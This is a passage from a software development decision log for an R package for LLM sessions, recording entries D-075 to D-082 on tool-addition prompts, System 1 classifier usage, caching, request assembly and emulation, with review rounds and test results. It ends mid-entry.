## D-075 - P07 tool additions: tools are declared by value only when the adapter and the model take them and the kernel can call them by name, hidden tools are never announced, before the first freeze only what the frozen array will not declare is announced, what the model already has is not declared again and cannot change, a member copy keeps every field, one failing spec is left out with a diagnostic (2026-10-04)

P07 Task 8 (`R/prompt-sections.R`). The contract 7.7 signature `session_add_tools(s, specs)`, the
`session.add_tools` service, `prompt_section_patch(s, name, text = NULL)`, the message texts and
the plan's 18 expectations are unchanged.

1. `prompt_tool_addition()`: the adapter of the model's `api` must declare `tool_addition` and
   the model must not refuse it (`capabilities$tool_addition` not `FALSE`, `tool_call` not
   `FALSE`), the rule P12's adapters apply when they send the declarations
   (`adp_model_cap(model, "tool_addition", TRUE)`). The plan's `adapter OR model` announced tools
   by value that the adapter then dropped, so they were never declared: for example every OpenAI
   catalog model on the Responses api (adapter TRUE, model FALSE) or a model claiming the
   capability behind `openai-completions`. Contract 7.7: "when the adapter declares
   `tool_addition`"; IC-74: per-model resolution, a model record does not grant what its adapter
   cannot send.
2. Only an un-namespaced, non-hidden spec with an `execute` is declared by value (P06's
   `tool_lookup()` resolves a call by the registry key and needs `execute`); a namespaced spec is
   announced as its member `gptr$<ns>$<name>()`; a `hidden` spec (callable by gptr code only,
   contract 9.1) is registered and never announced. The plan declared every spec by value,
   including uncallable namespaced and hidden ones, or made a hidden one the visible member
   `gptr$tools$<name>()`.
3. Before the first freeze (`.d$frozen` empty and no `gptr.frozen` to restore, or an IC-52
   refreeze; `prompt_frozen_now()`) nothing is declared by value, and a spec the frozen array
   will declare itself (`prompt_tool_always()`: no namespace, exposure `"direct"`, an `execute`,
   not a core tool) is registered and not announced: P06's `run_freeze()` runs the
   `session_start` hooks, which may call `ctx$add_tools()`, before `prompt.freeze`, and the
   freeze declares session direct tools in the array, so the plan's message declared them a
   second time. Every other non-hidden tool is handled as after the freeze without tool
   additions and announced by the queued member note, flushed at the first request: a namespaced
   non-`r` spec becomes its member, and namespaced `r` members and un-namespaced members (a `fun`,
   for example a core tool or an `r` spec) keep their names (review round 1: the first fix
   registered these silently, so the model never learned of them; contract 7.7 and IC-69 announce
   every added tool). Review round 2: namespaced `r` members are announced too, although P10's
   `plugins` section may list them: whether the frozen prompt has that section depends on the
   preset (`minimal` switches it off), the run's `opts$preset` and the `session_start` or
   `.opts$system` overrides, which the freeze decides later, and a line listed twice costs a few
   tokens once.
4. `prompt_member_spec()` re-validates the modified spec with `gptr_spec("tool", ...)` and keeps
   every field; the plan's `do.call(gptr_tool, ...)` dropped `render` and extension fields.
5. A spec whose conversion, schema, signature line or registration fails is left out with a
   diagnostic before it is registered (review round 2: the member signature line is now built
   before registration too), and the other specs are announced (contract 9.1, as at freeze). The
   plan registered all specs, then evaluated the schemas, so one failing `parameters()` left
   registered but unannounced tools and an error. A non-spec `specs` is `gptr_error_invalid_argument`.
6. What the model already has is not announced again and cannot change (review round 1;
   `prompt_tools_known()` reads the frozen array and the `tool_change` messages of the active
   path and the queue, so a resumed session counts its earlier additions). A tool whose name the
   model has by value (the frozen array or an earlier addition) is not declared again: the same
   spec is a no-op, an equal declaration only replaces the implementation, and a changed
   declaration (or a hidden spec under that name) is left out with a `builtin:prompt` /
   `add_tools` diagnostic, since the frozen array never changes (IC-69) and a second declaration
   of a name is a duplicate tool. A member signature line already announced for its key is not
   repeated; a changed one is announced again. Registration replaces the session's earlier rank-0
   `session` record of the key (`prompt_session_register()`), because P02 resolves a same-rank
   tie to the first record and `tool_lookup()` would run the old spec under the new declaration;
   a different spec that still would not be the record that runs (a rank-0 record of the session
   from another source, or a filter) is left out with a diagnostic. A spec that the winning
   record already holds at rank 0 for the session, whatever its source, is announced and not
   registered again (review round 2): P08's `gateway_continue_session()` enables `plugins =` at
   rank 0 for the session (P17, source `plugin:<name>`) and passes `registry_get()` of each new
   tool so that it is announced; the round-1 check refused those. The round-1 reviewer's "skip the
   announcement for a spec identical to the session's current record" stays declined: the skip is
   of the registration only, and the announcement is keyed on what the model was told.
7. The declarations of earlier `tool_change` messages count as known only while the model takes
   tool additions (review round 2): an adapter without them drops those declarations (P12), so
   after a switch to such a model (`session_set_model()`, a P08 continuation with `model =`) a
   re-added tool is offered as a member instead of being a silent no-op. The frozen array's
   declarations always count.

Open for other owners (not changed here): Haiku 4.5 has `tool_addition = TRUE` with `mid_system =
FALSE`, and P12's Anthropic adapter sends `tool_addition` blocks only in a mid-conversation system
message, so its declarations are dropped (P05 catalog or P12 adapter). P08's
`gateway_register()` registers a changed `tools =` spec at rank 0 behind the session's earlier
record of that name, so `registry_get()` hands P07 the old spec; P08 should replace the earlier
record. P10's `ns_catalog()` lists the session's rank-0 namespaced `r` members (it reads
`registry_all("tool", session = ...)`); item 3 no longer relies on it. P07's compaction tasks: the
`tool_change` declarations before a cut must stay declared after it.

Validation: `progress/P07.md`, Task 8. Five tests (32 expectations) were added; on the plan
literal 14 of them fail (`dev/.validation/P07/task8-plan-literal2.log`). Review round 1 added three
tests (27 expectations); on the pre-fix source 21 of them fail
(`dev/.validation/P07/task8-fix1-red-final.log`). Review round 2 added four tests (24
expectations) and changed two round-1 tests (+1 expectation); on the pre-fix source 11 of them
fail (`dev/.validation/P07/task8-fix2-red-final.log`). Final `^prompt-sections$`: `[ FAIL 0 | WARN
0 | SKIP 0 | PASS 326 ]`.

## D-076 - P13 model-layer wrappers: unknown System 1 usage stays NA, a missing request id gets a fresh one and a malformed one is refused, and the s1 area reaches the preflight and preparation through wrappers (2026-10-04)

P13 Task 2 (`R/s1-types.R`). The plan's nine wrappers are kept with their signatures; three points
differ from the plan literal.

1. **Unknown usage is not a zero charge (IC-74, 07 section 5; D-015).** The plan's `s1_cost()`
   replaced a missing token count and a missing cost with 0, so a System 1 answer without usage
   would be booked as a known free request. `s1_cost(usage, model)` now gives `NA` when a count on
   a priced component is unknown (NULL or NA) or no price is in force, and 0 for a declared zero
   rate (local inference) even with unknown counts, as P05's `usage_cost()` defines. It reads
   `usage[["input"]]`/`usage[["output"]]`; the plan's `usage$input` partially matched a record's
   `input_tokens`. The plan's assertion `s1_cost(list(), rec) == 0` is now `NA_real_`.
2. **`s1_usage_log()` accepts unknown counts and a missing request id.** NULL or NA `input` and
   `output` are written as `NA` (with an `NA` cost) instead of failing in `usage_new()`, and a NULL,
   scalar NA or empty `request_id` (Ollama's decision API sends no `x-typesafe-request-id`) gets a
   fresh id from `usage_row()`, which refuses an NA id. Any other value that is not one non-empty
   string (several ids, a number, a list) is passed on, so `usage_row()` refuses it with
   `gptr_error_invalid_argument` and nothing is appended (D-015 item 4; review round 1).
3. **Two wrappers beyond the plan: `s1_preflight(model, provider, safety = NULL)` and
   `s1_prepare(ref, safety = NULL)`.** Contract 7.5 (IC-74) names P13 as a consumer of
   `provider_preflight()` and `model_prepare()` in `catalog-models.R` (L1), and 07 section 2.1
   requires the pure preflight before state/image serialisation, credential lookup and dispatch.
   The L4 files of the s1 area may not call L1 (`test-arch-layers.R`), so they get the same
   delegating wrappers; `safety` passes through unchanged.

For later P13 tasks (plan literals that IC-74 changes; review round 1 added the Task 4 and Task 8
dispatch points):

- Task 4's `s1_request()` should call `s1_preflight()` on the resolved model before
  `s1_credential()`, state/image serialisation and `build()`. It should pick the adapter from the
  resolved model's api, `s1_adapter(model$api)`, not `s1_adapter(provider$api)` (plan line 2330),
  so Clef on the mixed `ollama` provider (provider api `openai-completions`) reaches
  `ollama-system-one` (07 section 2). The `engine` passed to `s1_dispatch()` likewise comes from the
  model's api or provider id, not `s1_engine(provider$api)` (line 2365; Task 8's target at line
  3762 too).
- Task 4's `s1_dispatch()` should keep unknown per-state usage NA when summing, not
  `input + (r$value$usage$input %||% 0)` / `output + (... %||% 0)` (lines 2277-2278), so the
  `s1_cost(usage, model)` at the end gives NA, not a known cost, when any state reported no usage.
- Calibration (07 section 3): the default `calibrated = TRUE` passed to `s1_dispatch()` (line 2365;
  Task 8's `calibrated = TRUE` at line 3762) and `calibrated = isTRUE(r$value$calibrated)` (line
  2281, which turns NA into FALSE) should keep unknown calibration NA; TRUE needs recorded
  calibration evidence.
- Tasks 5, 6 and 8 (lines 2650, 2982, 3982, 4085-4086) should pass unknown counts and cost through
  rather than the plan's `%||% 0`.

Validation: `progress/P13.md`, Task 2. `^s1-types$`: red `[ FAIL 12 | WARN 0 | SKIP 0 | PASS 161 ]`,
green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 212 ]`; lint clean; the plan-literal `s1_cost()` gives 0
for empty usage and 0.042 for `list(input_tokens = 1e6)` (`dev/.validation/P13/task2-probe.log`).
Review round 1: regression red `[ FAIL 4 | WARN 0 | SKIP 0 | PASS 216 ]`, green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 220 ]`.

## D-077 - P13 System 1 wire adapter: classify$parse takes the questions and returns validated canonical answers, unreported usage stays NA, a model's decision record sets the question limits, two harness helpers wait for their functions (2026-10-04)

P13 Task 3 (`R/s1-client.R`, `tests/testthat/test-s1-client.R`, `tests/testthat/fixtures/jev/`).
The question builder, the conditions, the error-body reader, the request builder and the TypeSafe
confidence formulas follow the plan. Five points differ from the plan literal.

1. **`s1_typesafe_parse(model, status, headers, body, questions)` returns canonical answers
   (IC-74, 07 section 3; contract 8.1 as amended).** The plan's four-argument parse returned the
   wire answers, and its tests parsed them a second time with `s1_parse_answers()`. P02's
   `kind_check_adapter()` already requires the five-argument `parse`, so the plan's adapter could
   not even be registered. Parse now normalises once, through `s1_parse_answers()`, into
   `list(type = "noul", prob)`, `list(type = "choice", choice, probabilities, confidence)` and
   `list(type = "score", score, probabilities, confidence, legend)`. Probabilities are named in
   request order, and the score's `legend` holds the requested level descriptions named
   `"0".."n-1"`, the same shape as P01's fake. A malformed answer inside a 200 body is an
   unsignalled `gptr_error_s1_response` that carries the response's status and request id.
2. **Answers are validated against the request (07 section 3).** The plan accepted extra
   probability keys, out-of-range probabilities and confidences, probabilities that do not sum
   to 1, a choice its own probabilities contradict, a score outside `[0, levels - 1]` or unequal
   to the expected level of its probabilities, and answers to questions that were not asked.
   Each of these is now `gptr_error_s1_response`. The tolerances follow TypeSafe's two-decimal
   rounding (report 04a): 0.005 per probability for the sum, 0.01 between the chosen option and
   the most probable one, and 0.005 per level index plus 0.005 for the score. An absent
   confidence or score is recomputed (TypeSafe's formulas; the score stays the fractional
   expected level). A present but invalid value is an error, not a recomputation. An empty or
   absent probability map is still "unavailable" (NA), not zero (report 04 section 2.9). A
   missing choice is the most probable option, the first in request order on a tie.
3. **Unreported usage is unknown (IC-74, 07 section 5; D-076).** The plan turned a missing token
   count into 0. `usage` now gives `NA` for a count that is absent, null or not a nonnegative
   number, so P13's `s1_cost()` reports an unknown cost rather than a known zero.
4. **`s1_question(..., decision = NULL)` (IC-74, 07 sections 2-3; report 04b: "do not assume
   Jev's documented candidate limits apply").** The plan hard-coded TypeSafe's limits (2-255
   options, 2-10 levels), so a Clef score with 11-26 levels could not be asked. The optional
   `decision` argument takes the resolved model's decision record: its `max_options` caps both
   options and levels, and its `types` restrict the question type (`gptr_error_invalid_argument`
   otherwise). Without a record, or a record without `max_options`, TypeSafe's limits apply as
   before. `labels` must be a character vector without NA.
5. **The harness omits `s1_fresh()` and `s1_test_call()` for now.** The two helpers call Task 5's
   `s1_cache_swap()` and P08's `call_new()`, which do not exist yet, so the package lint
   (`object_usage_linter`, which also covers `tests/testthat/fixtures/`) reports them. Lint
   suppressions are not allowed. Task 5 adds `s1_fresh()`, and the first task that needs
   `s1_test_call()` adds it once P08's `call_new()` exists, both verbatim from the plan. Every
   other helper is the plan's.

For later P13 tasks:

- Task 4's `s1_request()` must call `adapter$classify$parse(model, status, headers, body,
  questions)`. `s1_dispatch()` must consume the canonical answers of every adapter
  (`typesafe-system-one`, the fake, `s1-emulate`, `ollama-system-one`) rather than call
  `s1_parse_answers()` on them again (plan line 2291; 07 section 3: "must not call the Jev wire
  parser a second time").
- P01's `fake_questions_check()` refuses choice criteria without descriptions (`{"dog": null}`,
  which is 04a's wire shape and what `s1_question(choices = c("dog", "cat"))` sends) with
  `gptr_error_s1_validation` ("choice and score questions need at least two text criteria";
  `dev/.validation/P13/task3-fake-probe.log`). Fake-classifier tests of Tasks 4-9 with undescribed
  choices fail until P01's fake accepts null descriptions or the tests use described choices. That
  is a decision for P01's owner or the coordinator, outside this lane.
- Task 8's `s1_run()` should pass `decision = target$model$decision` to `s1_question()`.
- The `ollama-system-one` task must not reuse `s1_confidence_choice()`/`s1_confidence_score()`
  (Ollama's confidence is `1 - H(p)/log(N)`). Its own wire normaliser must produce the same
  canonical shape and validation.

Validation: `progress/P13.md`, Task 3. `^s1-client$`: red `[ FAIL 18 | WARN 0 | SKIP 0 | PASS 0 ]`
(every failure a missing function), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 190 ]` (the plan's
literal assertions are 126 of them); lint clean.

## D-078 - P13 System 1 requests: the resolved model is preflighted and picks its own adapter, dispatch validates canonical answers without a wire parser, unknown usage and calibration stay NA, the engine is the provider id, a model's decision record lowers the requests in flight (2026-10-04)

P13 Task 4 (`R/s1-client.R`, `tests/testthat/test-s1-client.R`). The transfer, the outcomes, the
pump, the wait, the rounds and the deduplication follow the plan. Nine points differ from the
plan literal, each required by IC-74 (07-local-ollama.md) or by the reviewed forward notes of
D-076 and D-077.

1. **Preflight first, adapter from the model (07 sections 2 and 2.1).** `s1_request()` calls
   `s1_preflight(model, provider, safety = opts$safety)` before it looks up an adapter or a
   credential or builds a request, and takes the adapter from the checked model's own api (the
   provider's api only when the model has none). The plan used `s1_adapter(provider$api)`, so
   Clef on the mixed `ollama` provider would have reached the chat adapter. `opts$safety` is the
   run's frozen safety record that P08/P06 hand down; NULL keeps the local-only default. A model
   whose adapter has no classify functions is refused with `gptr_error_invalid_argument` before
   any request (the plan failed with "attempt to apply non-function").
2. **Canonical answers are validated, never parsed again (07 section 3; D-077).** `classify$parse`
   receives `questions`. `s1_dispatch()` no longer calls `s1_parse_answers()`; the new
   `s1_check_answers()`, `s1_check_answer()` and `s1_check_probs()` validate the canonical records
   of every adapter: exactly the question ids, their types, a `prob` in [0, 1], probabilities
   named by exactly the options (re-keyed into request order, summing to 1 within report 04a's
   rounding, or all NA when unavailable), a confidence in [0, 1] or NA (never recomputed, since
   the formulas differ by provider), a choice its probabilities support, a fractional score its
   probabilities give and a legend named by the levels. They reuse Task 3's generic helpers
   (`s1_answer_probs()`, `s1_parse_choice()`, `s1_parse_score()`). A failure is a
   `gptr_error_s1_response` that carries the request id.
3. **Unknown usage stays unknown (07 section 5; D-076).** The per-request counts are summed with
   `s1_count()`, so one request without usage makes the total `NA` and `s1_cost()` `NA`. The plan
   added `%||% 0`.
4. **Calibration is unknown unless stated (07 section 3; D-073, D-076).** `s1_request()` passes
   `calibrated = NA` (the plan: `TRUE`), and the results' statements are combined with
   `s1_meta_combine()`'s rule: TRUE only when every result says TRUE, FALSE when any says FALSE,
   NA otherwise (the plan kept the last result's `isTRUE()`, turning NA into FALSE). P01's fake
   reports NA, so the plan's `expect_true(res$calibrated)` became `expect_identical(..., NA)`.
   Jev answers through `typesafe-system-one` are therefore NA ("calibration unknown") until a
   later task records calibration evidence for them; contract 5.2's footer example
   (`jev-1.13.0 . calibrated`) needs that record.
5. **The engine is the provider id (contract 5.2 as amended by IC-74).** `s1_engine(model)`
   returns the model's provider id, or `"emulated:structured"` for the `s1-emulate` api; an
   adapter result's own `engine` still wins (P01's fake reports `"fake"`). The plan's
   `s1_engine(api)` mapped api names onto a fixed set.
6. **A model's decision record lowers the requests in flight (07 section 2).**
   `s1_active_cap(model)` is `min(gptr.s1_max_active, decision$max_active)` (Clef: 1); the global
   option stays the upper bound. `gptr.s1_max_active` and `gptr.s1_rounds` must be positive whole
   numbers (`gptr_error_invalid_argument`): with 0 the plan would never start a job and would
   pump forever. Process-wide admission per server across concurrent System 1 calls is left to
   the `s1-ollama.R` task.
7. **Provenance (07 section 3).** The result gains `provenance = list(provider, api, execution,
   locality, digest, server_version, calibration_provenance)`. The checked model's fields (from
   P05's discovery evidence) come before what an adapter reports, and locality is `"unknown"`
   unless one of them establishes it. P01's fake already reports these fields, and without this
   element the dispatch would drop them.
8. **Robustness.** Adapter-result and transport-condition fields, and `opts[["provider"]]` and
   `opts[["safety"]]`, are read with `[[`, because `$` partially matches a longer name (an option
   `safety_snapshot` must not relax local-only). A request id that is not one non-empty string is
   ignored, and a result that is not a list is a `gptr_error_s1_response`.
9. **One score expectation (review round 1; changes Task 3's `s1_parse_score()`, D-077 item 2).**
   A missing score was filled with the normalised expected level `sum(lv * p) / sum(p)`, but a
   given score was compared with the raw `sum(lv * p)`. When two-decimal probabilities summed
   below 1, the dispatch re-check then refused the score the parser had just filled in (5 levels,
   `{0, 0, 0, 0, 0.98}`: filled 4, raw 3.92, tolerance 0.055). Both now use the normalised
   expectation, and a given score must lie within
   `s1_round_tol * (sum(levels) + 1) / min(1, sum(p))` of it, which bounds a score computed from
   the unrounded probabilities and rounded to two decimals.

For later P13 tasks:

- Task 6's emulation must return canonical records (a score with its `legend`), because
  `s1_dispatch()` validates them; it passes `calibrated = FALSE`.
- Task 8's `s1_target_of()` should use `s1_engine(rec)` and keep `calibrated` NA unless calibration
  evidence is recorded, and `s1_run()` should take `res$calibrated` without `isTRUE()`. It should
  pass the run's frozen safety record as `opts$safety` and may copy `res$provenance` into `meta`.
- The `s1-ollama.R` task owns per-server admission across calls.

Validation: `progress/P13.md`, Task 4. `^s1-client$`: red `[ FAIL 11 | WARN 0 | SKIP 0 | PASS 190 ]`
(every failure a missing `s1_request`, `s1_http`, `s1_wait` or `s1_transport_outcome`), green
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 279 ]`; after review round 1 (items 8 and 9) red
`[ FAIL 4 | WARN 0 | SKIP 0 | PASS 282 ]`, green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 286 ]`.
A scratch copy with the plan-literal choices (provider api, `calibrated = TRUE`, no decision
cap, `%||% 0`) and a nested pump that allows every run fails five tests
(`dev/.validation/P13/task4-negative.log`). Lint is clean.

## D-079 - P07 gptr_prompt(): a session's prompt kept only in gptr.frozen is shown from that entry, a preview never queues operator messages, `preset` is validated against the presets the session sees (2026-10-04)

P07 Task 9 (`R/prompt-sections.R`, one statement of `R/prompt-context.R`). The export
`gptr_prompt(x = NULL, preset = NULL, tokens = TRUE)`, the five fields of `gptr_prompt_view`
(contract 5.11) with the attributes `preset` and `tool_names`, `print.gptr_prompt_view()` and the
plan's 22 expectations are unchanged.

1. For a session whose `.d$frozen` is empty but whose active path holds a `gptr.frozen` entry, the
   plan composed a fresh prompt with the current settings. Contract 6.6 shows "its frozen system
   blocks", and the next `prompt_freeze()` restores that entry (Task 7) unless an IC-52 refreeze
   is pending, so the view now takes `prompt_frozen_now()` (Task 8): `.d$frozen`, else `NULL`
   when `.d$refreeze` is set (a foreign file resumed under IC-52 freezes a fresh prompt from the
   current settings at its next run, so the view composes it, as the plan did), else
   `prompt_frozen_restore()` (read only: nothing is stored). With the plan literal a session
   frozen with `preset = "minimal"` showed the `standard` composition.
2. A preview renders the first message with `preview = TRUE`, which already keeps a pending plan
   (P11's `plan.pending`, `consume = FALSE`); `context_collect()` still queued every
   operator-authority block as a `reminder` in the session's memo, so each call of
   `gptr_prompt(s)` before the first run added one more reminder for the model. A preview now
   drops them, as a call without a session did; the plan's own roxygen says the view "writes
   nothing".
3. `preset` is validated with `preset_record(preset, session_id)`, i.e. against the registered
   presets plus the session's own rank-0 records (IC-69), the same lookup the composition uses;
   the plan's `registry_get("preset", preset)` without the session refused a session preset that
   the composition accepts. The error (class, message, `arg`, `expected`) is unchanged.

Validation: `progress/P07.md`, Task 9. Four tests (24 expectations) were added; on the plan
literal 5 expectations of the first three fail (`dev/.validation/P07/task9-plan-literal.log`),
and the pending-refreeze test (review round 1) fails 3 on the first form of item 1
(`task9-fix1-red.log`). Final `^prompt-sections$`: `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 372 ]`.

## D-080 - P13 System 1 cache: the call's adapter, model digest, server version and ordered images join the key, a choice key keeps its option order, an Ollama model without a digest is never cached, unknown values are stored as null, cached records are validated canonical answers (2026-10-04)

P13 Task 5 (`R/s1-cache.R`, `tests/testthat/test-s1-cache.R`, `s1_fresh()` in
`tests/testthat/fixtures/jev/harness.R`). The memory store before a workspace, the file layout
`cache/s1/<2hex>/<sha256>.json`, the committed salt, the `cache_commit` `.gitignore`, the mtime
touch on a hit, the 11 record fields and contract 11.9's key for a call without an identity follow
the plan; its 7 tests and 32 assertions are kept (one changed and one added, item 5). Six points
differ, each required by IC-74 (07-local-ollama.md sections 2-5) or by the reviewed forward notes
of D-076 to D-078.

1. **The call's identity joins the key (07 sections 2 and 4).** New `s1_cache_identity(model,
   images = NULL)` builds, from the resolved and preflighted model record and the call's
   `.opts$system1_images`, `list(adapter = <model api>, digest, server_version, images =
   list(list(sha256, mime), ...))` with absent fields left out; the image bytes are hashed in
   list order and never kept, and the list's names are dropped first (a named list would become a
   JSON object whose keys `canonical_json()` sorts, losing the request order; review round 1).
   `s1_cache_keys(salt, endpoint, model, question, states, identity = NULL)` adds a non-empty
   identity as the key field `identity`, so new weights under the same tag, another server
   version, another adapter, other image bytes, MIME types or image order never answer from the
   cache. Without an identity the key is contract 11.9's verbatim. Jev gives
   `list(adapter = "typesafe-system-one")`: its alias stays the key, so a new Jev release under
   `jev-latest` still answers from the cache (contract 11.9).
2. **No durable reuse without an immutable identity (07 sections 2 and 2.1).** An Ollama model
   without a digest gets `mutable = TRUE`, and its keys are `NA_character_`. An Ollama model is
   one on P05's Ollama route (`catalog_ollama_route()`): api `ollama-system-one` or provider
   `ollama`, so an Ollama chat model used as an emulation target is covered too (review round 1;
   07 section 2 states the rule for any mutable tag). `s1_cache_get(NA)` is NULL and
   `s1_cache_put(NA, record)` stores nothing, in memory or on disk, so the caller needs no special
   branch; under replay such a call is a miss.
   Any other key that is not 64 lower-case hex digits is refused with
   `gptr_error_invalid_argument` (keys become file names).
3. **A choice key keeps the request order of its options (07 section 3: request option order and
   tie behaviour).** `canonical_json()` sorts the named criteria, so the plan's key gave
   `choices = c("dog", "cat")` and `c("cat", "dog")` the same key; a choice question now adds
   `options` (its option names in request order). Noul and score keys are unchanged (score
   criteria are an array).
4. **Unknown values stay unknown (07 section 5; D-076).** The plan stored a missing token count as
   0 (`usage$input %||% 0`); unknown counts, probabilities and confidences are now JSON null
   (jsonlite writes `NA_real_` as the string `"NA"`) and read back as NA. Fields are read with
   `[[`, since `$` partially matches a longer name such as `input_tokens`.
5. **Cached records are validated canonical answers (07 section 3).** `s1_cache_answer(record,
   question)` re-keys the stored probabilities into request order and runs Task 4's
   `s1_check_answer()`, so a committed record that the question cannot have produced (unknown
   choice, probabilities over other options or not summing to 1, a choice its probabilities do not
   support, a score they do not give, an invalid confidence) is a miss (NULL), never an answer. A
   score answer carries its `legend` rebuilt from the question; the record does not store it
   (level descriptions are question text, IC-70). The plan's round-trip assertion therefore
   expects the canonical score with its legend.
6. **A file under another key or with broken JSON is a miss.** `s1_cache_get()` returns NULL when
   the file cannot be read or parsed or its `key` field differs from the key asked.

For later P13 tasks:

- Task 8's `s1_answers()` should preflight the target model (`s1_preflight()`) before it computes
  the keys, so the identity is the checked one (live lookup validates the currently resolved
  identity, 07 section 4), and pass `s1_cache_identity(model, images)` to `s1_cache_keys()`.
  Replay passes the frozen identity recorded with the result and the locally supplied images,
  without discovery.
- Task 8 must treat a NULL from `s1_cache_answer()` as a miss (the plan marked the element cached
  unconditionally); NA keys need nothing.
- Tasks 6 and 8 pass `usage = list(input, output)` with unknown counts as NULL or NA.

Validation: `progress/P13.md`, Task 5. `^s1-cache$`: red `[ FAIL 13 | WARN 0 | SKIP 0 | PASS 0 ]`
(every failure a missing `s1_cache_*` function), green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 106 ]`
(plan assertions 32, one added to a plan test, 73 in six IC-74 tests). Review round 1 added 7
regression assertions (named image lists, an Ollama chat model without a digest): red
`[ FAIL 5 | WARN 0 | SKIP 0 | PASS 108 ]`, green `[ FAIL 0 | WARN 0 | SKIP 0 | PASS 113 ]`. Lint
is clean.

## D-081 - P07 request assembly: a session with a pending IC-52 refreeze is frozen afresh by request_build(), the session's thinking level is clamped to the target's levels, the target's level is read by exact name and images elided on the path are projected as sent (2026-10-04)

P07 Task 10 (`R/prompt-cache.R`, `builtin_prompt()` in `R/prompt-sections.R`). The adapter
context of contract 8.1, the element view, the ledger estimate, the `default` cache policy with
its anchors, the gap rule and the cache key, the `request.build` service and the plan's 11 tests
(52 expectations) are unchanged, except that item 4 projects images already elided on the path.

1. **A pending refreeze is honoured (IC-52).** The plan froze an unfrozen session with
   `prompt_freeze(s)`, which restores the newest `gptr.frozen` entry on the path. A foreign file
   resumed under IC-52 keeps that file's entry with `.d$refreeze = TRUE` (P06 `rebuild_fill()`),
   so a request built before the session's first run (a manual compaction, Task 13's direct
   `prompt_request_context()`) restored and sent the untrusted prompt that IC-52 says must be
   rebuilt. New `prompt_request_frozen(s)` (used by `request_build()` and
   `prompt_request_context()`) passes `refreeze = isTRUE(.d$refreeze)` and consumes the flag
   afterwards, as P06's `run_freeze()` does. A run is unaffected: `run_freeze()` freezes first.
2. **The session's level is clamped to the target (IC-74; P06 `run_target()`).** The plan took
   `target$thinking %||% .d$thinking`, which sends the session's level unclamped to a model that
   does not offer it when the target carries no level (a direct call, a compaction). The fallback
   is now `model_clamp_thinking(target$thinking_levels, .d$thinking)`, P06's own rule; a target's
   level still wins.
3. **The target's level is read by exact name.** `target$thinking` partially matches
   `thinking_levels` for a record without a `thinking` field, so the plan sent the model's whole
   level vector as `params$thinking` (shown by the test: `c("off", "low")`). It is now
   `target[["thinking"]]`; `max_output` is read the same way, and a non-finite `max_output` gives
   the 8,192 default instead of an `NA` integer.

4. **Images elided on the path are projected as sent (IC-67; review round 1).** P05 leaves
   `gptr.image_elision` to P06 or P07 (P05 decision 21), and P06's `run_build()` elides after
   `request.build` returns. The plan's projection kept every image, so each image already elided
   by an earlier request counted at full image cost in `tokens_est` and the `images` component
   on every later request (4 images of 1000 x 1000 with `max_images = 1`: 5,184 instead of the
   1,296 sent). That overstated estimate went into `budget_check()`, the ledger row,
   `before_request` and the estimator multiplier. P06 D-036 item 8 already made the fallback and
   `context_tokens()` count elided images as their omission text. New `prompt_elided_images(s)`
   reads the ids of the path's `gptr.image_elision` entries. New `prompt_images_elided()`
   replaces every block with such an id by `block_text("[image omitted: gptr$plot(\"<id>\")]")`.
   The id is 8 hex of the data's sha256, and both the id and the text are byte for byte those of
   P06's `images_elide()`. `prompt_request_context()` applies this to the projection (not to the
   `extra` tail), so the context, the view and the estimate show what P06 sends, and P06's
   `images_elide()` then leaves the messages unchanged (the test checks both). The rule is
   reimplemented in P07 rather than calling P06's internal `image_id()` / `image_omitted_text()`,
   because architecture 2.2 lets L3 `prompt` call only L0-L2 and the kernel SDK. The test ties
   the copy to P06's real function. Consequences: the request after an elision hashes the elided
   message as sent. Its view therefore differs there from the previous request, but its epoch
   counts the new entry, so it is a stated break (Task 11). Task 13's checkpoint request, which
   is sent without P06's `run_build()`, also carries the recorded elisions. Residual (P06,
   routed to the coordinator): the one request at which P06 newly elides images is still
   estimated before `images_elide()` runs, so that request alone overcounts. Fixing it would
   need `run_build()` to re-estimate after appending a `gptr.image_elision` entry.

Validation: `progress/P07.md`, Task 10. Three tests (21 expectations) were added. On the plan
literal 9 of the first 13 fail (`dev/.validation/P07/task10-plan-literal.log`). Item 4's test
was red with 4 of its 8 failing (`task10-fix1-red.log`). Final `^prompt-cache$`:
`[ FAIL 0 | WARN 0 | SKIP 0 | PASS 73 ]`.

## D-082 - P13 System 1 emulation: emulated answers are canonical records validated against the request, an all-zero distribution is refused, a reply that did not stop normally is a response error, the chat model is preflighted before any state is serialised, unreported usage stays NA, both entry points show the uncalibrated notice, an emulated request has no session id, a failed stream is classified by its cause, open requests are let go of on interrupt and a refused reply's usage counts (2026-10-04)

P13 Task 6 (`R/s1-emulate.R`, `tests/testthat/test-s1-emulate.R`). These follow the plan:

- the adapter's prompt and the `<document>` wrapper with `<`/`>` escaped;
- the closed schema with the questions in the property descriptions (noul criteria included);
- fence stripping, rescaling of a sum off by more than 1e-6, and TypeSafe's confidence formulas;
- the request context of contract 8.1;
- `s1_emulate(model, states, questions)` in the `s1_dispatch()` shape, with
  `engine = "emulated:structured"` and `calibrated = FALSE`;
- `s1_emulate_classify(model, state, questions, opts)`.

The plan's 5 tests are kept, with 3 assertions changed and 1 added (item 1). Seven points differ,
each required by IC-74 (07-local-ollama.md sections 2.1, 3 and 5) or by the forward notes of
D-076 to D-080.

1. **Canonical answers (07 section 3).** `s1_emu_wire()` decodes the reply once into the
   canonical records every adapter returns:
   - noul: `list(type = "noul", prob)`, where the plan had the wire field `noul`;
   - choice and score: `probabilities` as a named double vector in request order, where the plan
     had `as.list(p)`;
   - score: also its `legend`.

   Task 4's `s1_dispatch()` checks canonical records with `s1_check_answers()` and refuses
   wire-shaped ones. The plan-literal shape therefore made every emulated element NA (negative
   control in `progress/P13.md`). Plan assertions changed: the noul record, the probabilities as
   a named vector, and `s1_emulate_classify()`'s answer read as `$prob`. One added: its `engine`.
2. **Validation against the request (07 section 3).** These are refused with
   `gptr_error_s1_response`:
   - answers not keyed by question, or not exactly the questions asked;
   - a choice or score that does not state one probability for exactly the allowed labels
     (extra, missing or duplicated labels);
   - a value that is not a finite number in [0, 1];
   - a reply that is not a JSON object.

   The plan ignored extra ids and labels and let jsonlite's decode error escape unclassed.
3. **No invented distribution.** A choice or score whose stated probabilities are all 0 is
   refused. The plan, like the adapter's `emu_rescale()`, replaced it with a uniform
